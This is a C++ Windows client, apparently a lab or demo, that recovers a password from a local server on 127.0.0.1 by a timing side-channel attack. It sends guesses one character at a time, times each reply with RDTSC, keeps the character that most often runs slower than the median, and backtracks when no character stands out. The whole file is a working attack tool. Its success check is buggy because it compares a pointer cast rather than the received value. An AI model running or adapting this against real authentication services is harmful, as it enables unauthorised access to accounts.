// ClientDemo.cpp : 定义控制台应用程序的入口点。
//
#include "stdafx.h"
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <ctime>  
#include <iostream>
#include <vector>
#include <algorithm>

using namespace std;
#pragma comment (lib, "Ws2_32.lib")

#define PORT 1304
#define IP_ADDRESS "127.0.0.1" 

const int MAX_PASSWORD_LEN = 16;

bool Check(const char * src, SOCKET clientSocket)
{
	char SendBuf[256] = { 0 };
	char RecvBuf[256] = { 0 };

	memcpy(SendBuf, src, sizeof(char)*MAX_PASSWORD_LEN);
	send(clientSocket, SendBuf, MAX_PASSWORD_LEN, 0);
	int ret = recv(clientSocket, RecvBuf, 4, 0);

	return ((int)RecvBuf == 0);
}

inline unsigned __int64 GetTimeStampCount()
{
	__asm RDTSC
}

int _tmain(int argc, _TCHAR* argv[])
{
	/*Ver 3.0*/

	//start socket
	WSADATA wsa;
	SOCKET clientSocket;
	struct sockaddr_in serverAddr;

	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
	{
		cout << "init socket failed!" << endl;
		return -1;
	}

	clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (clientSocket == INVALID_SOCKET)
	{
		cout << "create socket failed!" << endl;
	}

	serverAddr.sin_family = AF_INET;
	serverAddr.sin_addr.s_addr = inet_addr(IP_ADDRESS);
	serverAddr.sin_port = htons(PORT);
	memset(serverAddr.sin_zero, 0x00, 8);

	int ret = connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
	if (ret != 0)
	{
		cout << "connect failed!" << endl;
		return -1;
	}
	else
	{
		cout << "connect success!" << endl;
	}


	char GotPassword[MAX_PASSWORD_LEN] = { 0 };
	int GotLen = 0;
	int OverAverageTimes[256] = { 0 };
	unsigned __int64 UsedTicks[256] = {0};

	char CurPassword[MAX_PASSWORD_LEN] = { 0 };
	char AvailableChar[256] = { 0 };
	int availabeCount = 0;

	int MaxTestTimes = 5 * 1024; //without net use: 10 * 1024;
	int AvailableDelta = 100;

	bool bGot = false;
	unsigned __int64 BeforeTime, AfterTime;
	bool bNext = true;
	while (!bGot && GotLen<MAX_PASSWORD_LEN)
	{
		if (bNext)
		{
			availabeCount = 0;
			for (char tmp = '!'; tmp <= '~'; ++tmp)
			{
				AvailableChar[availabeCount++] = tmp;
			}
		}
		memcpy(CurPassword, GotPassword, sizeof(GotPassword));


		unsigned __int64 currentPassTotal = 0;
		for (int j = 0; j < MaxTestTimes*availabeCount; ++j)
		{
			int i = j%availabeCount;
			CurPassword[GotLen] = AvailableChar[i];
			BeforeTime = GetTimeStampCount();
			bGot = Check(CurPassword, clientSocket);
			AfterTime = GetTimeStampCount();
			unsigned __int64 curTick = AfterTime - BeforeTime;
			if (bGot)
			{
				break;
			}
			UsedTicks[i] = curTick;
			currentPassTotal += curTick;

			if (i%availabeCount == 0)	//one pass
			{
				//unsigned __int64 curAvg = currentPassTotal / availabeCount;
				vector<unsigned __int64> vTicks(UsedTicks, UsedTicks + availabeCount);
				std::sort(vTicks.begin(), vTicks.end());
				unsigned __int64 middleTime = vTicks[(vTicks.size()-1)/2];
				for (int idx = 0; idx < availabeCount; ++idx)
				{
					if (UsedTicks[idx] > middleTime)
					{
						OverAverageTimes[idx]++;
					}
				}
				currentPassTotal = 0;
			}

		}
		if (!bGot)
		{
			int averageTime = 0, maxTime = 0, totalTime = 0;
			int maxIdx = 0;
			for (int i = 0; i < availabeCount; ++i)
			{
				totalTime += OverAverageTimes[i];
				if (OverAverageTimes[i] > maxTime)
				{
					maxTime = OverAverageTimes[i];
					maxIdx = i;
				}
			}
			averageTime = totalTime / availabeCount;

			//got current lucky?
			if (maxTime > averageTime + MaxTestTimes / 5 || GotLen == 0) //without net use 5	// 1/2 ? 1/10 ?
			{
				GotPassword[GotLen++] = AvailableChar[maxIdx];
				cout<<"current got password:" << GotPassword << endl;
			}
			else
			{
				cout << "No lucky path:" << CurPassword << " avg:" << averageTime << " cur max:" << maxTime << endl;
				
				//back from wrong road
				cout << "backout password:" << GotPassword << endl;
				GotPassword[GotLen] = 0;
				if (GotLen > 0)
				{
					GotLen--;
				}
			}
			memset(OverAverageTimes, 0, sizeof(OverAverageTimes));
			memset(UsedTicks, 0, sizeof(UsedTicks));
		}
	}

	cout << "Got the password:" << CurPassword << endl;
	system("Pause");

}

